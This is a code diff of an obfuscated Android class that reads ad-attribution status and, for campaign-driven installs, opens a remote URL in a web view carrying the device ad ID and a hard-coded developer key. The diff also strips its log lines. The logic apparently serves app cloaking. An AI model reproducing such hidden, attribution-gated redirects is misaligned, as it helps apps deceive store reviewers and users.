@@ -1,5 +1,7 @@
 package com.ssetcer.oefljgun;
 
+import static com.ssetcer.oefljgun.aaa.appsFlyerConversionListenerSsetcerOefljgun;
+
 import android.content.Intent;
 import android.util.Base64;
 import android.util.Log;
@@ -23,38 +25,18 @@ public class HTTPconect extends SOJ {
     public static String lineSsetcerOefljgun;
     public static String kkOnekkCkkignalSsetcerOefljgun = "YzExMTUyYmMtODhlYi00YmMwLTgyMTQtMWU1ZmVlMjJmN2Vj";
     public static String KK_APPPS_KK_ID_SSERCER_OEFLJGUN = "RUZuQ29XeUFxc1RGb2hXaTY2M2UzQg==";
-    public String paramsSsetcerOefljgun;
-    public String appKkStatusSsetcerOefljgun = "";
+    public static String paramsSsetcerOefljgun;
+    public static String appKkStatusSsetcerOefljgun = "";
 
-    AppsFlyerConversionListener appsFlyerConversionListenerSsetcerOefljgun = new AppsFlyerConversionListener() {
-        @Override
-        public void onConversionDataSuccess(Map<String, Object> map) {
-            appKkStatusSsetcerOefljgun = Objects.requireNonNull(map.get(Dec("YWZfc3RhdHVz")).toString());
-            if (appKkStatusSsetcerOefljgun.equals(Dec("Tm9uLW9yZ2FuaWM="))) {
-                String kKkCampaingStatusSsetcerOefljgun = Objects.requireNonNull(map.get(Dec("Y2FtcGFpZ24="))).toString();
-                paramsSsetcerOefljgun = MPars(kKkCampaingStatusSsetcerOefljgun);
-            }
-        }
-        @Override
-        public void onConversionDataFail(String s) {
-        }
-        @Override
-        public void onAppOpenAttribution(Map<String, String> map) {
-        }
-        @Override
-        public void onAttributionFailure(String s) {
-        }
-    };
+
 
 
     public void MainMethod(String linkSsetcerOefljgun, String keySsetcerOefljgun, String fbDataSsetcerOefljgun, SOJ sojSsetcerOefljgun) {
         if (appKkStatusSsetcerOefljgun.equals(Dec("Tm9uLW9yZ2FuaWM="))) {
             String trueMainSsetcerOefljgun = (linkSsetcerOefljgun + paramsSsetcerOefljgun);
-            Log.i(SOJ.LOG, "Non-organic: " + trueMainSsetcerOefljgun);
             sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
         } else if (fbDataSsetcerOefljgun != null) {
             String trueMainSsetcerOefljgun = (linkSsetcerOefljgun + fbDataSsetcerOefljgun);
-            Log.i(SOJ.LOG, "FbbStatus: " + trueMainSsetcerOefljgun);
             sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
         } else {
             if (keySsetcerOefljgun.equals(Dec("Tk8="))) {
@@ -66,7 +48,6 @@ public class HTTPconect extends SOJ {
                         Dec("JmFkX2lkPQ==") + SOJ.kKkIdContextSsetcerOefljgun + Dec("JmFwcHNfaWQ9") +
                         SOJ.idAppsKKSsetcerOefljgun + Dec("JmRldl9rZXk9") + Dec(KK_APPPS_KK_ID_SSERCER_OEFLJGUN));
                 String trueMainSsetcerOefljgun = linkSsetcerOefljgun + paramsExitSsetcerOefljgun;
-                Log.i(SOJ.LOG, "organic: " + trueMainSsetcerOefljgun);
                 sojSsetcerOefljgun.goWeb(trueMainSsetcerOefljgun);
             }
         }
@@ -110,16 +91,16 @@ public class HTTPconect extends SOJ {
         return idAppsKKSsetcerOefljgun;
     }
 
-    String keySsetcerOefljgun;
-    String sub6SsetcerOefljgun;
-    String sub7SsetcerOefljgun;
-    String sub2SsetcerOefljgun;
-    String sub3SsetcerOefljgun;
-    String sub4SsetcerOefljgun;
-    String sub5SsetcerOefljgun;
-    public String[] lineArraySsetcerOefljgun;
+    static String keySsetcerOefljgun;
+    static String sub6SsetcerOefljgun;
+    static String sub7SsetcerOefljgun;
+    static String sub2SsetcerOefljgun;
+    static String sub3SsetcerOefljgun;
+    static String sub4SsetcerOefljgun;
+    static String sub5SsetcerOefljgun;
+    static public String[] lineArraySsetcerOefljgun;
 
-    public String MPars(String lineGetSsetcerOefljgun) {
+    public static String MPars(String lineGetSsetcerOefljgun) {
 
         lineArraySsetcerOefljgun = lineGetSsetcerOefljgun.split("::");
 
